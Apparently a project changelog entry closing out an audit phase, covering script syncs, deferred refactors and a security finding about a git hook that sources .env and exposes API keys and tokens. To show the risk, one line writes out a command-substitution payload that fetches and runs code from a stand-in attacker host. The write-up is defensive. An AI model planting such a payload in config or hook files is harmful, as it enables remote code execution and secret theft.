**Deferred to follow-up (Bucket 2 entangled with `_log.py`).** `archive_review_tasks.py` and `backfill_completed_dates.py` carry real wins — repo-root path resolution (fixes worktree-subdir invocations), `_atomic_write_pair()` two-file atomic rewrite, defensive `Archive Total` row parsing, `<path>.tmp` + `os.replace` + parent-dir fsync atomic rewrite, basename-only error messages — but BR's implementations import `_sanitize_log` from a sibling `_log.py` module that doesn't exist upstream. Sysop has at least two inline copies of the same `_sanitize_log` helper (`backfill_completed_dates.py:55-68`, `run_checks/cli.py`); BR consolidated to one, and the question of whether to promote `_log.py` upstream is a real architectural call (single source of truth vs. each-script-self-contained). Filed as a separate medium-priority REVIEW_CHECKLIST entry with both paths and a recommendation toward ship-`_log.py`, deliberately out of Phase 51's scope to keep the close-out small and bisectable.

**Skipped — no-op next update (Bucket 1).** `run_checks_impl.py` — BR's preserved copy is the pre-Phase-49 1113-line monolith; Sysop upstream is now a 64-line shim + a `run_checks/` package. On BR's next `bash scripts/sysop-update.sh` cycle, the Phase 24b preservation should detect the structural change and overwrite cleanly (the file is a managed path, no `--accept-upstream` flag needed). No audit-time action.

**Skipped — fork by design (Bucket 3).** `hooks/pre-commit` — Sysop ships a B*/A*-placeholder skeleton (Phase 2F.2's deliberate shape); BR ships ledger-specific bean-check enforcement. The fork is intentional: Sysop's pre-commit hook is meant to be a template consumer projects populate with their own conventions, not a one-size-fits-all worked example. No audit-time action.

**Real fork — security finding filed (Bucket 3).** `hooks/pre-merge-commit` surfaced two problems that survived the 2F/2I generalization pass. **(1) Security**: the hook unconditionally `source`s `.env` to "load DB_PASS and other secrets" before invoking pytest — this exports every variable in `.env` (including `ANTHROPIC_API_KEY`, third-party OAuth tokens, MCP bearer tokens) into the pytest process even if the tests don't need them, and `source` runs the file as shell so `$(curl https://attacker/sh)` or backticks inside `.env` execute on every merge commit (`.env` is gitignored, so attacker delivery is supply-chain or social-engineering). BR removed the source block entirely with an explanatory comment. **(2) gdp-shape**: the same file still references `agent/*.py`, `frontend/app/`, `migrations/*.sql`, `frontend/__tests__/`, `npm run build` against `frontend/` — gdp identifiers that the 2F/2I generalization passes never touched. Both issues filed as one new HIGH-priority REVIEW_CHECKLIST entry, with the recommended fix being (a) drop `source .env` unconditionally (plumb explicit pytest fixtures if a consumer's tests truly need secrets) and (b) generalize the path scans to a B*/A*-placeholder skeleton mirroring `pre-commit`'s 2F.2 shape, shipping the current content as `examples/pre-merge-commit-python.example` with header note. Out of Phase 51's scope: the fix wants its own phase to do justice to both halves and to author the new example file deliberately.

**Verification all green.** `bash -n` syntax check on `batch_work.sh` + `cleanup_worktrees.sh` post-cp. Python compile check (`python -m py_compile`) on all four Python scripts cp'd. Full 274-test pytest suite passes in 0.64s before and after the bundle — no test changes, no patch-path adjustments needed because none of the cp'd scripts add `_log` imports (BR's `_log`-using scripts — `archive_review_tasks.py` + `backfill_completed_dates.py` — are exactly the deferred pair). Pre-cp `grep -nE "^(from|import) " <BR-version>` on the three Python cp candidates confirmed zero `_log` imports before any file touched. The audit ran read-only first (no file edits during classification), then all writes happened in the same atomic-from-the-tree-perspective sequence (5 cp's + 1 Edit) so a mid-flow abort would leave a partial state observable via `git status`.

**Out of scope (intentionally).** Promoting `_log.py` upstream (filed as a separate medium-priority entry — wants its own design pass, not bundled with a cleanup phase). Fixing the pre-merge-commit security finding (HIGH-priority but wants the gdp-shape generalization bundled — two halves want one careful phase). The `run_checks_impl.py` audit (Phase 49 made it a shim; BR's preserved copy absorbs structurally on next `--update`).
